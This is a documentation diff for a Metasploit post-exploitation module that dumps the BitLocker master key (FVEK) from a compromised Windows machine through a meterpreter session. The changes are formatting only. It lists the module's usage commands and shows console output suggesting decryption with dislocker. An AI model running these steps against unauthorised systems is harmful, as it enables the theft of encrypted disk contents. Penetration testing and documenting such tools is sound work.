@@ -3,28 +3,28 @@
 This module enumerates ways to decrypt Bitlocker volume and if a recovery key is stored locally or can be generated, dump the Bitlocker master key (FVEK)
 
 ## Verification Steps
-  1. Start `msfconsole`
+  1. Start msfconsole
   2. Get meterpreter session
-  3. Do: `use post/windows/gather/bitlocker_fvek`
-  4. Do: `set SESSION <session id>`
-  5. Do: `set DRIVE_LETTER <letter>`
-  6. Do: `run`
+  3. Do: ```use post/windows/gather/bitlocker_fvek```
+  4. Do: ```set SESSION <session id>```
+  5. Do: ```set DRIVE_LETTER <letter>```
+  6. Do: ```run```
 
 ## Options
 
-  ```
+  ***
   DRIVE_LETTER
-  ```
-  Dump informations from the DRIVE_LETTER encrypted with Bitlocker.
+  ***
+  Dump information from the DRIVE_LETTER encrypted with Bitlocker.
 
-  ```
+  ***
   RECOVERY_KEY
-  ```
+  ***
   Use the recovery key provided to decrypt the Bitlocker master key (FVEK).
 
-  ```
+  ***
   SESSION
-  ```
+  ***
   The session to run this module on.
 
 ## Scenarios
@@ -49,7 +49,7 @@ This module enumerates ways to decrypt Bitlocker volume and if a recovery key is
     [+] This hard drive could later be decrypted using : dislocker -k <key_file> ...
     [*] Post Successful
     [*] Post module execution completed
-  msf5 post(windows/gather/bitlocker_fvek) > sessions 1
+  msf post(windows/gather/bitlocker_fvek) > sessions 1
     [*] Starting interaction with 1...
 
   meterpreter > sysinfo
